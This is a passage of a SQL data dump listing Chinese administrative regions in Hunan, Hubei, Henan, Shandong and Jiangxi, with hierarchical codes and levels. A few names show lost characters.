e',9506,2),(18655,'隆回县','9505.7','nativeplace',9506,2),(18654,'邵阳县','9505.6','nativeplace',9506,2),(18653,'新邵县','9505.5','nativeplace',9506,2),(18652,'邵东县','9505.4','nativeplace',9505,2),(18651,'北塔区','9505.3','nativeplace',9505,2),(18650,'大祥区','9505.2','nativeplace',9505,2),(18649,'双清区','9505.1','nativeplace',9505,2),(18648,'邵阳市','9505','nativeplace',9505,1),(18647,'常宁市','9504.12','nativeplace',9504,2),(18646,'耒阳市','9504.11','nativeplace',9504,2),(18645,'祁东县','9504.10','nativeplace',9504,2),(18644,'衡东县','9504.9','nativeplace',9505,2),(18643,'衡山县','9504.8','nativeplace',9505,2),(18642,'衡南县','9504.7','nativeplace',9505,2),(18641,'衡阳县','9504.6','nativeplace',9505,2),(18640,'南岳区','9504.5','nativeplace',9505,2),(18639,'蒸湘区','9504.4','nativeplace',9504,2),(18638,'石鼓区','9504.3','nativeplace',9504,2),(18637,'雁峰区','9504.2','nativeplace',9504,2),(18636,'珠晖区','9504.1','nativeplace',9504,2),(18635,'衡阳市','9504','nativeplace',9504,1),(18634,'韶山市','9503.5','nativeplace',9504,2),(18633,'湘乡市','9503.4','nativeplace',9503,2),(18632,'湘潭县','9503.3','nativeplace',9503,2),(18631,'岳塘区','9503.2','nativeplace',9503,2),(18630,'雨湖区','9503.1','nativeplace',9503,2),(18629,'湘潭市','9503','nativeplace',9503,1),(18628,'醴陵市','9502.9','nativeplace',9503,2),(18627,'炎陵县','9502.8','nativeplace',9503,2),(18626,'茶陵县','9502.7','nativeplace',9503,2),(18625,'攸　县','9502.6','nativeplace',9503,2),(18624,'株洲县','9502.5','nativeplace',9503,2),(18623,'天元区','9502.4','nativeplace',9502,2),(18622,'石峰区','9502.3','nativeplace',9502,2),(18621,'芦淞区','9502.2','nativeplace',9502,2),(18620,'荷塘区','9502.1','nativeplace',9502,2),(18619,'株洲市','9502','nativeplace',9502,1),(18618,'浏阳市','9501.9','nativeplace',9502,2),(18617,'宁乡县','9501.8','nativeplace',9502,2),(18616,'望城县','9501.7','nativeplace',9502,2),(18615,'长沙县','9501.6','nativeplace',9502,2),(18614,'雨花区','9501.5','nativeplace',9502,2),(18613,'开福区','9501.4','nativeplace',9501,2),(18612,'岳麓区','9501.3','nativeplace',9501,2),(18611,'天心区','9501.2','nativeplace',9501,2),(18610,'芙蓉区','9501.1','nativeplace',9501,2),(18609,'长沙市','9501','nativeplace',9501,1),(18608,'湖南省','9500','nativeplace',9500,0),(18607,'神农架林区','9014.4','nativeplace',9014,2),(18606,'天门市','9014.3','nativeplace',9014,2),(18605,'潜江市','9014.2','nativeplace',9014,2),(18604,'仙桃市','9014.1','nativeplace',9014,2),(18603,'省直辖行政单位','9014','nativeplace',9014,1),(18602,'鹤峰县','9013.8','nativeplace',9014,2),(18601,'来凤县','9013.7','nativeplace',9014,2),(18600,'咸丰县','9013.6','nativeplace',9014,2),(18599,'宣恩县','9013.5','nativeplace',9014,2),(18598,'巴东县','9013.4','nativeplace',9013,2),(18597,'建始县','9013.3','nativeplace',9013,2),(18596,'利川市','9013.2','nativeplace',9013,2),(18595,'恩施市','9013.1','nativeplace',9013,2),(18594,'恩施土家族苗族自治州','9013','nativeplace',9013,1),(18593,'广水市','9012.2','nativeplace',9012,2),(18592,'曾都区','9012.1','nativeplace',9012,2),(18591,'随州市','9012','nativeplace',9012,1),(18590,'赤壁市','9011.6','nativeplace',9012,2),(18589,'通山县','9011.5','nativeplace',9012,2),(18588,'崇阳县','9011.4','nativeplace',9011,2),(18587,'通城县','9011.3','nativeplace',9011,2),(18586,'嘉鱼县','9011.2','nativeplace',9011,2),(18585,'咸安区','9011.1','nativeplace',9011,2),(18584,'咸宁市','9011','nativeplace',9011,1),(18583,'武穴市','9010.10','nativeplace',9010,2),(18582,'麻城市','9010.9','nativeplace',9011,2),(18581,'黄梅县','9010.8','nativeplace',9011,2),(18580,'蕲春县','9010.7','nativeplace',9011,2),(18579,'浠水县','9010.6','nativeplace',9011,2),(18578,'英山县','9010.5','nativeplace',9011,2),(18577,'罗田县','9010.4','nativeplace',9010,2),(18576,'红安县','9010.3','nativeplace',9010,2),(18575,'团风县','9010.2','nativeplace',9010,2),(18574,'州区','9010.1','nativeplace',9010,2),(18573,'黄冈市','9010','nativeplace',9010,1),(18572,'松滋市','9009.8','nativeplace',9010,2),(18571,'洪湖市','9009.7','nativeplace',9010,2),(18570,'石首市','9009.6','nativeplace',9010,2),(18569,'江陵县','9009.5','nativeplace',9010,2),(18568,'监利县','9009.4','nativeplace',9009,2),(18567,'公安县','9009.3','nativeplace',9009,2),(18566,'荆州区','9009.2','nativeplace',9009,2),(18565,'沙市区','9009.1','nativeplace',9009,2),(18564,'荆州市','9009','nativeplace',9009,1),(18563,'汉川市','9008.7','nativeplace',9009,2),(18562,'孝南区','9008.6','nativeplace',9009,2),(18561,'孝昌县','9008.5','nativeplace',9009,2),(18560,'大悟县','9008.4','nativeplace',9008,2),(18559,'云梦县','9008.3','nativeplace',9008,2),(18558,'应城市','9008.2','nativeplace',9008,2),(18557,'安陆市','9008.1','nativeplace',9008,2),(18556,'孝感市','9008','nativeplace',9008,1),(18555,'东宝区','9007.5','nativeplace',9008,2),(18554,'掇刀区','9007.4','nativeplace',9007,2),(18553,'京山县','9007.3','nativeplace',9007,2),(18552,'沙洋县','9007.2','nativeplace',9007,2),(18551,'钟祥市','9007.1','nativeplace',9007,2),(18550,'荆门市','9007','nativeplace',9007,1),(18549,'鄂城区','9006.3','nativeplace',9006,2),(18548,'华容区','9006.2','nativeplace',9006,2),(18547,'梁子湖区','9006.1','nativeplace',9006,2),(18546,'鄂州市','9006','nativeplace',9006,1),(18545,'宜城市','9005.9','nativeplace',9006,2),(18544,'枣阳市','9005.8','nativeplace',9006,2),(18543,'老河口市','9005.7','nativeplace',9006,2),(18542,'保康县','9005.6','nativeplace',9006,2),(18541,'谷城县','9005.5','nativeplace',9006,2),(18540,'南漳县','9005.4','nativeplace',9005,2),(18539,'襄阳区','9005.3','nativeplace',9005,2),(18538,'樊城区','9005.2','nativeplace',9005,2),(18537,'襄城区','9005.1','nativeplace',9005,2),(18536,'襄樊市','9005','nativeplace',9005,1),(18535,'枝江市','9004.13','nativeplace',9004,2),(18534,'当阳市','9004.12','nativeplace',9004,2),(18533,'宜都市','9004.11','nativeplace',9004,2),(18532,'五峰土家族自治县','9004.10','nativeplace',9004,2),(18531,'长阳土家族自治县','9004.9','nativeplace',9005,2),(18530,'秭归县','9004.8','nativeplace',9005,2),(18529,'兴山县','9004.7','nativeplace',9005,2),(18528,'远安县','9004.6','nativeplace',9005,2),(18527,'夷陵区','9004.5','nativeplace',9005,2),(18526,'?亭区','9004.4','nativeplace',9004,2),(18525,'点军区','9004.3','nativeplace',9004,2),(18524,'伍家岗区','9004.2','nativeplace',9004,2),(18523,'西陵区','9004.1','nativeplace',9004,2),(18522,'宜昌市','9004','nativeplace',9004,1),(18521,'丹江口市','9003.8','nativeplace',9004,2),(18520,'房　县','9003.7','nativeplace',9004,2),(18519,'竹溪县','9003.6','nativeplace',9004,2),(18518,'竹山县','9003.5','nativeplace',9004,2),(18517,'郧西县','9003.4','nativeplace',9003,2),(18516,'郧　县','9003.3','nativeplace',9003,2),(18515,'张湾区','9003.2','nativeplace',9003,2),(18514,'茅箭区','9003.1','nativeplace',9003,2),(18513,'十堰市','9003','nativeplace',9003,1),(18512,'大冶市','9002.6','nativeplace',9003,2),(18511,'阳新县','9002.5','nativeplace',9003,2),(18510,'铁山区','9002.4','nativeplace',9002,2),(18509,'下陆区','9002.3','nativeplace',9002,2),(18508,'西塞山区','9002.2','nativeplace',9002,2),(18507,'黄石港区','9002.1','nativeplace',9002,2),(18506,'黄石市','9002','nativeplace',9002,1),(18505,'新洲区','9001.13','nativeplace',9001,2),(18504,'黄陂区','9001.12','nativeplace',9001,2),(18503,'江夏区','9001.11','nativeplace',9001,2),(18502,'蔡甸区','9001.10','nativeplace',9001,2),(18501,'汉南区','9001.9','nativeplace',9002,2),(18500,'东西湖区','9001.8','nativeplace',9002,2),(18499,'洪山区','9001.7','nativeplace',9002,2),(18498,'青山区','9001.6','nativeplace',9002,2),(18497,'武昌区','9001.5','nativeplace',9002,2),(18496,'汉阳区','9001.4','nativeplace',9001,2),(18495,'乔口区','9001.3','nativeplace',9001,2),(18494,'江汉区','9001.2','nativeplace',9001,2),(18493,'江岸区','9001.1','nativeplace',9001,2),(18492,'武汉市','9001','nativeplace',9001,1),(18491,'湖北省','9000','nativeplace',9000,0),(18490,'新蔡县','8517.10','nativeplace',8517,2),(18489,'遂平县','8517.9','nativeplace',8518,2),(18488,'汝南县','8517.8','nativeplace',8518,2),(18487,'泌阳县','8517.7','nativeplace',8518,2),(18486,'确山县','8517.6','nativeplace',8518,2),(18485,'正阳县','8517.5','nativeplace',8518,2),(18484,'平舆县','8517.4','nativeplace',8517,2),(18483,'上蔡县','8517.3','nativeplace',8517,2),(18482,'西平县','8517.2','nativeplace',8517,2),(18481,'驿城区','8517.1','nativeplace',8517,2),(18480,'驻马店市','8517','nativeplace',8517,1),(18479,'项城市','8516.10','nativeplace',8516,2),(18478,'鹿邑县','8516.9','nativeplace',8517,2),(18477,'太康县','8516.8','nativeplace',8517,2),(18476,'淮阳县','8516.7','nativeplace',8517,2),(18475,'郸城县','8516.6','nativeplace',8517,2),(18474,'沈丘县','8516.5','nativeplace',8517,2),(18473,'商水县','8516.4','nativeplace',8516,2),(18472,'西华县','8516.3','nativeplace',8516,2),(18471,'扶沟县','8516.2','nativeplace',8516,2),(18470,'川汇区','8516.1','nativeplace',8516,2),(18469,'周口市','8516','nativeplace',8516,1),(18468,'息　县','8515.10','nativeplace',8515,2),(18467,'淮滨县','8515.9','nativeplace',8516,2),(18466,'潢川县','8515.8','nativeplace',8516,2),(18465,'固始县','8515.7','nativeplace',8516,2),(18464,'商城县','8515.6','nativeplace',8516,2),(18463,'新　县','8515.5','nativeplace',8516,2),(18462,'光山县','8515.4','nativeplace',8515,2),(18461,'罗山县','8515.3','nativeplace',8515,2),(18460,'平桥区','8515.2','nativeplace',8515,2),(18459,'师河区','8515.1','nativeplace',8515,2),(18458,'信阳市','8515','nativeplace',8515,1),(18457,'永城市','8514.9','nativeplace',8515,2),(18456,'夏邑县','8514.8','nativeplace',8515,2),(18455,'虞城县','8514.7','nativeplace',8515,2),(18454,'柘城县','8514.6','nativeplace',8515,2),(18453,'宁陵县','8514.5','nativeplace',8515,2),(18452,'睢　县','8514.4','nativeplace',8514,2),(18451,'民权县','8514.3','nativeplace',8514,2),(18450,'睢阳区','8514.2','nativeplace',8514,2),(18449,'梁园区','8514.1','nativeplace',8514,2),(18448,'商丘市','8514','nativeplace',8514,1),(18447,'邓州市','8513.13','nativeplace',8513,2),(18446,'桐柏县','8513.12','nativeplace',8513,2),(18445,'新野县','8513.11','nativeplace',8513,2),(18444,'唐河县','8513.10','nativeplace',8513,2),(18443,'社旗县','8513.9','nativeplace',8514,2),(18442,'淅川县','8513.8','nativeplace',8514,2),(18441,'内乡县','8513.7','nativeplace',8514,2),(18440,'镇平县','8513.6','nativeplace',8514,2),(18439,'西峡县','8513.5','nativeplace',8514,2),(18438,'方城县','8513.4','nativeplace',8513,2),(18437,'南召县','8513.3','nativeplace',8513,2),(18436,'卧龙区','8513.2','nativeplace',8513,2),(18435,'宛城区','8513.1','nativeplace',8513,2),(18434,'南阳市','8513','nativeplace',8513,1),(18433,'灵宝市','8512.6','nativeplace',8513,2),(18432,'义马市','8512.5','nativeplace',8513,2),(18431,'卢氏县','8512.4','nativeplace',8512,2),(18430,'陕　县','8512.3','nativeplace',8512,2),(18429,'渑池县','8512.2','nativeplace',8512,2),(18428,'湖滨区','8512.1','nativeplace',8512,2),(18427,'三门峡市','8512','nativeplace',8512,1),(18426,'临颍县','8511.5','nativeplace',8512,2),(18425,'舞阳县','8511.4','nativeplace',8511,2),(18424,'召陵区','8511.3','nativeplace',8511,2),(18423,'郾城区','8511.2','nativeplace',8511,2),(18422,'源汇区','8511.1','nativeplace',8511,2),(18421,'漯河市','8511','nativeplace',8511,1),(18420,'长葛市','8510.6','nativeplace',8511,2),(18419,'禹州市','8510.5','nativeplace',8511,2),(18418,'襄城县','8510.4','nativeplace',8510,2),(18417,'鄢陵县','8510.3','nativeplace',8510,2),(18416,'许昌县','8510.2','nativeplace',8510,2),(18415,'魏都区','8510.1','nativeplace',8510,2),(18414,'许昌市','8510','nativeplace',8510,1),(18413,'濮阳县','8509.6','nativeplace',8510,2),(18412,'台前县','8509.5','nativeplace',8510,2),(18411,'范　县','8509.4','nativeplace',8509,2),(18410,'南乐县','8509.3','nativeplace',8509,2),(18409,'清丰县','8509.2','nativeplace',8509,2),(18408,'华龙区','8509.1','nativeplace',8509,2),(18407,'濮阳市','8509','nativeplace',8509,1),(18406,'孟州市','8508.11','nativeplace',8508,2),(18405,'沁阳市','8508.10','nativeplace',8508,2),(18404,'济源市','8508.9','nativeplace',8509,2),(18403,'温　县','8508.8','nativeplace',8509,2),(18402,'武陟县','8508.7','nativeplace',8509,2),(18401,'博爱县','8508.6','nativeplace',8509,2),(18400,'修武县','8508.5','nativeplace',8509,2),(18399,'山阳区','8508.4','nativeplace',8508,2),(18398,'马村区','8508.3','nativeplace',8508,2),(18397,'中站区','8508.2','nativeplace',8508,2),(18396,'解放区','8508.1','nativeplace',8508,2),(18395,'焦作市','8508','nativeplace',8508,1),(18394,'辉县市','8507.12','nativeplace',8507,2),(18393,'卫辉市','8507.11','nativeplace',8507,2),(18392,'长垣县','8507.10','nativeplace',8507,2),(18391,'封丘县','8507.9','nativeplace',8508,2),(18390,'延津县','8507.8','nativeplace',8508,2),(18389,'原阳县','8507.7','nativeplace',8508,2),(18388,'获嘉县','8507.6','nativeplace',8508,2),(18387,'新乡县','8507.5','nativeplace',8508,2),(18386,'牧野区','8507.4','nativeplace',8507,2),(18385,'凤泉区','8507.3','nativeplace',8507,2),(18384,'卫滨区','8507.2','nativeplace',8507,2),(18383,'红旗区','8507.1','nativeplace',8507,2),(18382,'新乡市','8507','nativeplace',8507,1),(18381,'淇　县','8506.5','nativeplace',8507,2),(18380,'浚　县','8506.4','nativeplace',8506,2),(18379,'淇滨区','8506.3','nativeplace',8506,2),(18378,'山城区','8506.2','nativeplace',8506,2),(18377,'鹤山区','8506.1','nativeplace',8506,2),(18376,'鹤壁市','8506','nativeplace',8506,1),(18375,'林州市','8505.9','nativeplace',8506,2),(18374,'内黄县','8505.8','nativeplace',8506,2),(18373,'滑　县','8505.7','nativeplace',8506,2),(18372,'汤阴县','8505.6','nativeplace',8506,2),(18371,'安阳县','8505.5','nativeplace',8506,2),(18370,'龙安区','8505.4','nativeplace',8505,2),(18369,'殷都区','8505.3','nativeplace',8505,2),(18368,'北关区','8505.2','nativeplace',8505,2),(18367,'文峰区','8505.1','nativeplace',8505,2),(18366,'安阳市','8505','nativeplace',8505,1),(18365,'汝州市','8504.10','nativeplace',8504,2),(18364,'舞钢市','8504.9','nativeplace',8505,2),(18363,'郏　县','8504.8','nativeplace',8505,2),(18362,'鲁山县','8504.7','nativeplace',8505,2),(18361,'叶　县','8504.6','nativeplace',8505,2),(18360,'宝丰县','8504.5','nativeplace',8505,2),(18359,'湛河区','8504.4','nativeplace',8504,2),(18358,'石龙区','8504.3','nativeplace',8504,2),(18357,'卫东区','8504.2','nativeplace',8504,2),(18356,'新华区','8504.1','nativeplace',8504,2),(18355,'平顶山市','8504','nativeplace',8504,1),(18354,'偃师市','8503.15','nativeplace',8503,2),(18353,'伊川县','8503.14','nativeplace',8503,2),(18352,'洛宁县','8503.13','nativeplace',8503,2),(18351,'宜阳县','8503.12','nativeplace',8503,2),(18350,'汝阳县','8503.11','nativeplace',8503,2),(18349,'嵩　县','8503.10','nativeplace',8503,2),(18348,'栾川县','8503.9','nativeplace',8504,2),(18347,'新安县','8503.8','nativeplace',8504,2),(18346,'孟津县','8503.7','nativeplace',8504,2),(18345,'洛龙区','8503.6','nativeplace',8504,2),(18344,'吉利区','8503.5','nativeplace',8504,2),(18343,'涧西区','8503.4','nativeplace',8503,2),(18342,'廛河回族区','8503.3','nativeplace',8503,2),(18341,'西工区','8503.2','nativeplace',8503,2),(18340,'老城区','8503.1','nativeplace',8503,2),(18339,'洛阳市','8503','nativeplace',8503,1),(18338,'兰考县','8502.10','nativeplace',8502,2),(18337,'开封县','8502.9','nativeplace',8503,2),(18336,'尉氏县','8502.8','nativeplace',8503,2),(18335,'通许县','8502.7','nativeplace',8503,2),(18334,'杞　县','8502.6','nativeplace',8503,2),(18333,'郊　区','8502.5','nativeplace',8503,2),(18332,'南关区','8502.4','nativeplace',8502,2),(18331,'鼓楼区','8502.3','nativeplace',8502,2),(18330,'顺河回族区','8502.2','nativeplace',8502,2),(18329,'龙亭区','8502.1','nativeplace',8502,2),(18328,'开封市','8502','nativeplace',8502,1),(18327,'登封市','8501.12','nativeplace',8501,2),(18326,'新郑市','8501.11','nativeplace',8501,2),(18325,'新密市','8501.10','nativeplace',8501,2),(18324,'荥阳市','8501.9','nativeplace',8502,2),(18323,'巩义市','8501.8','nativeplace',8502,2),(18322,'中牟县','8501.7','nativeplace',8502,2),(18321,'邙山区','8501.6','nativeplace',8502,2),(18320,'上街区','8501.5','nativeplace',8502,2),(18319,'金水区','8501.4','nativeplace',8501,2),(18318,'管城回族区','8501.3','nativeplace',8501,2),(18317,'二七区','8501.2','nativeplace',8501,2),(18316,'中原区','8501.1','nativeplace',8501,2),(18315,'郑州市','8501','nativeplace',8501,1),(18314,'河南省','8500','nativeplace',8500,0),(18313,'东明县','8016.9','nativeplace',8017,2),(18312,'定陶县','8016.8','nativeplace',8017,2),(18311,'鄄城县','8016.7','nativeplace',8017,2),(18310,'郓城县','8016.6','nativeplace',8017,2),(18309,'巨野县','8016.5','nativeplace',8017,2),(18308,'成武县','8016.4','nativeplace',8016,2),(18307,'单　县','8016.3','nativeplace',8016,2),(18306,'曹　县','8016.2','nativeplace',8016,2),(18305,'牡丹区','8016.1','nativeplace',8016,2),(18304,'荷泽市','8016','nativeplace',8016,1),(18303,'邹平县','8015.7','nativeplace',8016,2),(18302,'博兴县','8015.6','nativeplace',8016,2),(18301,'沾化县','8015.5','nativeplace',8016,2),(18300,'无棣县','8015.4','nativeplace',8015,2),(18299,'阳信县','8015.3','nativeplace',8015,2),(18298,'惠民县','8015.2','nativeplace',8015,2),(18297,'滨城区','8015.1','nativeplace',8015,2),(18296,'滨州市','8015','nativeplace',8015,1),(18295,'临清市','8014.8','nativeplace',8015,2),(18294,'高唐县','8014.7','nativeplace',8015,2),(18293,'冠　县','8014.6','nativeplace',8015,2),(18292,'东阿县','8014.5','nativeplace',8015,2),(18291,'茌平县','8014.4','nativeplace',8014,2),(18290,'莘　县','8014.3','nativeplace',8014,2),(18289,'阳谷县','8014.2','nativeplace',8014,2),(18288,'东昌府区','8014.1','nativeplace',8014,2),(18287,'聊城市','8014','nativeplace',8014,1),(18286,'禹城市','8013.11','nativeplace',8013,2),(18285,'乐陵市','8013.10','nativeplace',8013,2),(18284,'武城县','8013.9','nativeplace',8014,2),(18283,'夏津县','8013.8','nativeplace',8014,2),(18282,'平原县','8013.7','nativeplace',8014,2),(18281,'齐河县','8013.6','nativeplace',8014,2),(18280,'临邑县','8013.5','nativeplace',8014,2),(18279,'庆云县','8013.4','nativeplace',8013,2),(18278,'宁津县','8013.3','nativeplace',8013,2),(18277,'陵　县','8013.2','nativeplace',8013,2),(18276,'德城区','8013.1','nativeplace',8013,2),(18275,'德州市','8013','nativeplace',8013,1),(18274,'临沭县','8012.12','nativeplace',8012,2),(18273,'蒙阴县','8012.11','nativeplace',8012,2),(18272,'莒南县','8012.10','nativeplace',8012,2),(18271,'平邑县','8012.9','nativeplace',8013,2),(18270,'费　县','8012.8','nativeplace',8013,2),(18269,'苍山县','8012.7','nativeplace',8013,2),(18268,'沂水县','8012.6','nativeplace',8013,2),(18267,'郯城县','8012.5','nativeplace',8013,2),(18266,'沂南县','8012.4','nativeplace',8012,2),(18265,'河东区','8012.3','nativeplace',8012,2),(18264,'罗庄区','8012.2','nativeplace',8012,2),(18263,'兰山区','8012.1','nativeplace',8012,2),(18262,'临沂市','8012','nativeplace',8012,1),(18261,'钢城区','8011.2','nativeplace',8011,2),(18260,'莱城区','8011.1','nativeplace',8011,2),(18259,'莱芜市','8011','nativeplace',8011,1),(18258,'莒　县','8010.4','nativeplace',8010,2),(18257,'五莲县','8010.3','nativeplace',8010,2),(18256,'岚山区','8010.2','nativeplace',8010,2),(18255,'东港区','8010.1','nativeplace',8010,2),(18254,'日照市','8010','nativeplace',8010,1),(18253,'乳山市','8009.4','nativeplace',8009,2),(18252,'荣成市','8009.3','nativeplace',8009,2),(18251,'文登市','8009.2','nativeplace',8009,2),(18250,'环翠区','8009.1','nativeplace',8009,2),(18249,'威海市','8009','nativeplace',8009,1),(18248,'肥城市','8008.6','nativeplace',8009,2),(18247,'新泰市','8008.5','nativeplace',8009,2),(18246,'东平县','8008.4','nativeplace',8008,2),(18245,'宁阳县','8008.3','nativeplace',8008,2),(18244,'岱岳区','8008.2','nativeplace',8008,2),(18243,'泰山区','8008.1','nativeplace',8008,2),(18242,'泰安市','8008','nativeplace',8008,1),(18241,'邹城市','8007.12','nativeplace',8007,2),(18240,'兖州市','8007.11','nativeplace',8007,2),(18239,'曲阜市','8007.10','nativeplace',8007,2),(18238,'梁山县','8007.9','nativeplace',8008,2),(18237,'泗水县','8007.8','nativeplace',8008,2),(18236,'汶上县','8007.7','nativeplace',8008,2),(18235,'嘉祥县','8007.6','nativeplace',8008,2),(18234,'金乡县','8007.5','nativeplace',8008,2),(18233,'鱼台县','8007.4','nativeplace',8007,2),(18232,'微山县','8007.3','nativeplace',8007,2),(18231,'任城区','8007.2','nativeplace',8007,2),(18230,'市中区','8007.1','nativeplace',8007,2),(18229,'济宁市','8007','nativeplace',8007,1),(18228,'昌邑市','8006.12','nativeplace',8006,2),(18227,'高密市','8006.11','nativeplace',8006,2),(18226,'安丘市','8006.10','nativeplace',8006,2),(18225,'寿光市','8006.9','nativeplace',8007,2),(18224,'诸城市','8006.8','nativeplace',8007,2),(18223,'青州市','8006.7','nativeplace',8007,2),(18222,'昌乐县','8006.6','nativeplace',8007,2),(18221,'临朐县','8006.5','nativeplace',8007,2),(18220,'奎文区','8006.4','nativeplace',8006,2),(18219,'坊子区','8006.3','nativeplace',8006,2),(18218,'寒亭区','8006.2','nativeplace',8006,2),(18217,'潍城区','8006.1','nativeplace',8006,2),(18216,'潍坊市','8006','nativeplace',8006,1),(18215,'海阳市','8005.12','nativeplace',8005,2),(18214,'栖霞市','8005.11','nativeplace',8005,2),(18213,'招远市','8005.10','nativeplace',8005,2),(18212,'蓬莱市','8005.9','nativeplace',8006,2),(18211,'莱州市','8005.8','nativeplace',8006,2),(18210,'莱阳市','8005.7','nativeplace',8006,2),(18209,'龙口市','8005.6','nativeplace',8006,2),(18208,'长岛县','8005.5','nativeplace',8006,2),(18207,'莱山区','8005.4','nativeplace',8005,2),(18206,'牟平区','8005.3','nativeplace',8005,2),(18205,'福山区','8005.2','nativeplace',8005,2),(18204,'芝罘区','8005.1','nativeplace',8005,2),(18203,'烟台市','8005','nativeplace',8005,1),(18202,'滕州市','8004.6','nativeplace',8005,2),(18201,'山亭区','8004.5','nativeplace',8005,2),(18200,'台儿庄区','8004.4','nativeplace',8004,2),(18199,'峄城区','8004.3','nativeplace',8004,2),(18198,'薛城区','8004.2','nativeplace',8004,2),(18197,'市中区','8004.1','nativeplace',8004,2),(18196,'枣庄市','8004','nativeplace',8004,1),(18195,'沂源县','8003.8','nativeplace',8004,2),(18194,'高青县','8003.7','nativeplace',8004,2),(18193,'桓台县','8003.6','nativeplace',8004,2),(18192,'周村区','8003.5','nativeplace',8004,2),(18191,'临淄区','8003.4','nativeplace',8003,2),(18190,'博山区','8003.3','nativeplace',8003,2),(18189,'张店区','8003.2','nativeplace',8003,2),(18188,'淄川区','8003.1','nativeplace',8003,2),(18187,'淄博市','8003','nativeplace',8003,1),(18186,'莱西市','8002.12','nativeplace',8002,2),(18185,'胶南市','8002.11','nativeplace',8002,2),(18184,'平度市','8002.10','nativeplace',8002,2),(18183,'即墨市','8002.9','nativeplace',8003,2),(18182,'胶州市','8002.8','nativeplace',8003,2),(18181,'城阳区','8002.7','nativeplace',8003,2),(18180,'李沧区','8002.6','nativeplace',8003,2),(18179,'崂山区','8002.5','nativeplace',8003,2),(18178,'黄岛区','8002.4','nativeplace',8002,2),(18177,'四方区','8002.3','nativeplace',8002,2),(18176,'市北区','8002.2','nativeplace',8002,2),(18175,'市南区','8002.1','nativeplace',8002,2),(18174,'青岛市','8002','nativeplace',8002,1),(18173,'章丘市','8001.10','nativeplace',8001,2),(18172,'商河县','8001.9','nativeplace',8002,2),(18171,'济阳县','8001.8','nativeplace',8002,2),(18170,'平阴县','8001.7','nativeplace',8002,2),(18169,'长清区','8001.6','nativeplace',8002,2),(18168,'历城区','8001.5','nativeplace',8002,2),(18167,'天桥区','8001.4','nativeplace',8001,2),(18166,'槐荫区','8001.3','nativeplace',8001,2),(18165,'市中区','8001.2','nativeplace',8001,2),(18164,'历下区','8001.1','nativeplace',8001,2),(18163,'济南市','8001','nativeplace',8001,1),(18162,'山东省','8000','nativeplace',8000,0),(18161,'德兴市','7511.12','nativeplace',7511,2),(18160,'婺源县','7511.11','nativeplace',7511,2),(18159,'万年县','7511.10','nativeplace',7511,2),(18158,'鄱阳县','7511.9','nativeplace',7512,2),(18157,'余干县','7511.8','nativeplace',7512,2),(18156,'弋阳县','7511.7','nativeplace',7512,2),(18155,'横峰县','7511.6','nativeplace',7512,2),(18154,'铅山县','7511.5','nativeplace',7512,2),(18153,'玉山县','7511.4','nativeplace',7511,2),(18152,'广丰县','7511.3','nativeplace',7511,2),(18151,'上饶县','7511.2','nativeplace',7511,2),(18150,'信州区','7511.1','nativeplace',7511,2),(18149,'上饶市','7511','nativeplace',7511,1),(18148,'广昌县','7510.11','nativeplace',7510,2),(18147,'东乡县','7510.10','nativeplace',7510,2),(18146,'资溪县','7510.9','nativeplace',7511,2),(18145,'金溪县','7510.8','nativeplace',7511,2),(18144,'宜黄县','7510.7','nativeplace',7511,2),(18143,'乐安县','7510.6','nativeplace',7511,2),(18142,'崇仁县','7510.5','nativeplace',7511,2),(18141,'南丰县','7510.4','nativeplace',7510,2),(18140,'黎川县','7510.3','nativeplace',7510,2),(18139,'南城县','7510.2','nativeplace',7510,2),(18138,'临川区','7510.1','nativeplace',7510,2),(18137,'抚州市','7510','nativeplace',7510,1),(18136,'高安市','7509.10','nativeplace',7509,2),(18135,'樟树市','7509.9','nativeplace',7510,2),(18134,'丰城市','7509.8','nativeplace',7510,2),(18133,'铜鼓县','7509.7','nativeplace',7510,2),(18132,'靖安县','7509.6','nativeplace',7510,2),(18131,'宜丰县','7509.5','nativeplace',7510,2),(18130,'上高县','7509.4','nativeplace',7509,2),(18129,'万载县','7509.3','nativeplace',7509,2),(18128,'奉新县','7509.2','nativeplace',7509,2),(18127,'袁州区','7509.1','nativeplace',7509,2),(18126,'宜春市','7509','nativeplace',7509,1),(18125,'井冈山市','7508.13','nativeplace',7508,2),(18124,'永新县','7508.12','nativeplace',7508,2),(18123,'安福县','7508.11','nativeplace',7508,2),(18122,'万安县','7508.10','nativeplace',7508,2),(18121,'遂川县','7508.9','nativeplace',7509,2),(18120,'泰和县','7508.8','nativeplace',7509,2),(18119,'永丰县','7508.7','nativeplace',7509,2),(18118,'新干县','7508.6','nativeplace',7509,2),(18117,'峡江县','7508.5','nativeplace',7509,2),(18116,'吉水县','7508.4','nativeplace',7508,2),(18115,'吉安县','7508.3','nativeplace',7508,2),(18114,'青原区','7508.2','nativeplace',7508,2),(18113,'吉州区','7508.1','nativeplace',7508,2),(18112,'吉安市','7508','nativeplace',7508,1),(18111,'南康市','7507.18','nativeplace',7507,2),(18110,'瑞金市','7507.17','nativeplace',7507,2),(18109,'石城县','7507.16','nativeplace',7507,2),(18108,'寻乌县','7507.15','nativeplace',7507,2),(18107,'会昌县','7507.14','nativeplace',7507,2),(18106,'兴国县','7507.13','nativeplace',7507,2),(18105,'于都县','7507.12','nativeplace',7507,2),(18104,'宁都县','7507.11','nativeplace',7507,2),(18103,'全南县','7507.10','nativeplace',7507,2),(18102,'定南县','7507.9','nativeplace',7508,2),(18101,'龙南县','7507.8','nativeplace',7508,2),(18100,'安远县','7507.7','nativeplace',7508,2),(18099,'崇义县','7507.6','nativeplace',7508,2),(18098,'上犹县','7507.5','nativeplace',7508,2),(18097,'大余县','7507.4','nativeplace',7507,2),(18096,'信丰县','7507.3','nativeplace',7507,2),(18095,'赣　县','7507.2','nativeplace',7507,2),(18094,'章贡区','7507.1','nativeplace',7507,2),(18093,'赣州市','7507','nativeplace',7507,1),(18092,'贵溪市','7506.3','nativeplace',7506,2),(18091,'余江县','7506.2','nativeplace',7506,2),(18090,'月湖区','7506.1','nativeplace',7506,2),(18089,'鹰潭市','7506','nativeplace',7506,1),(18088,'分宜县','7505.2','nativeplace',7505,2),(18087,'渝水区','7505.1','nativeplace',7505,2),(18086,'新余市','7505','nativeplace',7505,1),(18085,'瑞昌市','7504.12','nativeplace',7504,2),(18084,'彭泽县','7504.11','nativeplace',7504,2),(18083,'湖口县','7504.10','nativeplace',7504,2),(18082,'都昌县','7504.9','nativeplace',7505,2),(18081,'星子县','7504.8','nativeplace',7505,2),(18080,'德安县','7504.7','nativeplace',7505,2),(18079,'永修县','7504.6','nativeplace',7505,2),(18078,'修水县','7504.5','nativeplace',7505,2),(18077,'武宁县','7504.4','nativeplace',7504,2),(18076,'九江县','7504.3'